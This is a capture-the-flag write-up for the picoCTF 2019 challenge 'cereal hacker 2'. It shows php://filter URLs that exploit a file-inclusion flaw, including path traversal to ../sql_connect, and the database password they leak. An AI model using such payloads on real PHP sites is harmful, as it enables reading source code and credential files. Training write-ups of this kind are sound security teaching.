# cereal hacker 2 - 500 points

## Description

Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195

## Solution

Using php filters, we can leak the source code.
<http://2019shell1.picoctf.com:62195/?file=php://filter/convert.base64-encode/resource=admin>

```php
<?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
...
```

This has a reference to `cookie.php`.

<http://2019shell1.picoctf.com:62195/?file=php://filter/convert.base64-encode/resource=cookie>
```php
<?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
...
```


This has a reference to `sql_connect.php` which looks interesting. If we can leak the credentials to the database, we can easily solve the problem.

<http://2019shell1.picoctf.com:62195/?file=php://filter/convert.base64-encode/resource=../sql_connect>
```php
$sql_server = 'localhost';
$sql_user = 'mysql';
$sql_pass = 'this1sAR@nd0mP@s5w0rD#%';
$sql_conn = new mysqli($sql_server, $sql_user, $sql_pass);
$sql_conn_login = new mysqli($sql_server, $sql_user, $sql_pass);
```
Leaks the credentials to the database.

Notice that because the host is `2019shell1.picoctf.com`, the same as the shell server, we can connect to `localhost` from the pico shell server.

After connecting, we can simply SELECT the flag from the database.
